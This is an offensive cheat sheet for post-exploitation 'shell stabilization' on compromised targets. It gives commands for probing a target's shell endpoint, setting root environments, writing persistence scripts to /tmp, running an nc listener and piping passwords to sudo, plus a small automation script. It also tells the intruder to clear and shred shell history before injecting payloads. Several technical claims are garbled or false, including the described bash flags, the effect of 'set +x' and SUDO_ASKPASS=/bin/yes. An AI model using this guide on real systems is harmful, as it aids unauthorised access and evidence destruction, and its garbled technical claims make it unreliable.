# Shell Stabilization: TTY Upgrade & Persistence

**Elevate shell capabilities on live targets. Maintain privilege escalation chains.**

## Attack Workflow
1. **Verify TTY Capability**: Confirm the remote shell accepts TTY requests.
2. **Capture PID**: Grab the target process ID for session persistence.
3. **Upgrade Shell**: Switch from standard shell to a stabilized `bash` or `zsh`.
4. **Set Environment**: Configure `PATH`, `HOME`, and `SHELL` to persist settings.
5. **Inject Payloads**: Write stable scripts or reverse shells to storage.

## Commands Section
### Detect TTY Support
```bash
nc -vz {target} 22
curl -I -s https://{target}/shell?cmd&id=1
# Or check via shell if connected:
echo $TERM
# Response 'xterm' or 'linux' usually means TTY is possible
```

### Capture Target PID
```bash
# If already connected via SSH or reverse shell:
echo $$
# Or try to find the parent shell PID if you lost the connection
ps -ef | grep -w "ssh"
ps -ef | grep "python3.*reverse"
```

### Upgrade to Stable Bash
```bash
# Run bash with specific flags to reduce overhead and stabilize
# -u sets user, -r enables readonly, --noprofile prevents loading unwanted env
bash --noprofile --norc -u
# If using zsh (more powerful):
zsh --noprofile --norc
```

### Set Persistent Environment
```bash
# Force HOME and PATH to known good locations
export HOME=/root
export PATH=/usr/local/bin:/usr/bin:/bin
export SUDO_ASKPASS=/bin/yes
export HISTFILE=/tmp/.bash_history
echo $PATH
# Verify you have the right tools
which python3 curl nc wget
```

### Stabilize for Payload Injection
```bash
# Create a backup of the current shell
cp ~/.bash_profile ~/.bash_profile.bak
# Ensure history is not lost
history | tee /tmp/.history_stable
# Create a script that reinitializes the shell on reboot
nano /tmp/stabilize.sh
cat << 'EOF' > /tmp/stabilize.sh
#!/bin/bash
export HOME=/root
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
export SUDO_ASKPASS=/bin/yes
export HISTFILE=/tmp/.history_stable
exec bash --noprofile --norc
EOF
chmod +x /tmp/stabilize.sh
```

## Tips & Shortcuts
- **Keep it Clean**: Always clear the shell history (`history -c`, `shred ~/.bash_history`) before injecting new payloads.
- **Use `set +x`**: Prevent execution of unexpected shell functions.
- **`--norc` is Key**: Never load `.bashrc` unless you audit it; it often contains debug info.
- **PID Persistence**: If you can't get the PID immediately, try `ps aux` to find the process group.
- **`sudo -S`**: Use `sudo -S` with echo-ed password to run privileged commands without file access.
- **`nc -l`**: Listen on a specific port for incoming connections from the host.

## Common Mistakes
- **Assuming `TERM=xterm`**: It might not be the right one for the target's shell. Try `xterm`, `linux`, or `vt100`.
- **Loading `~/.bashrc`**: This loads many harmless variables that can break your injection or hide flags.
- **Ignoring PID**: If you lose the PID, you can't easily reattach to the session.
- **No Permission Check**: Don't assume you have `sudo` rights; use `sudo -l` to check.
- **History Loss**: If you lose the connection, history is lost unless saved to `/tmp`.

## Mini Automation Script (Bash)
```bash
#!/bin/bash
# stabilize_target.sh
# Usage: ./stabilize_target.sh {target_ip}

TARGET=${1:-{target}}
PID=$$

echo "Target: $TARGET, PID: $PID"
sleep 2

# Set stable variables
export HOME=/root
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
export SHELL=/bin/bash
export TERM=xterm

# Save history
history > /tmp/.history_stable

# Verify environment
echo "Environment Set: HOME=$HOME, PATH=$PATH"
echo "Shell: $SHELL"
echo "History Saved: /tmp/.history_stable"

# Optional: Create a reverse shell listener
# curl -X POST "https://{target}/shell" -d "cmd=id&pid=$PID" -H "Accept: application/json"
```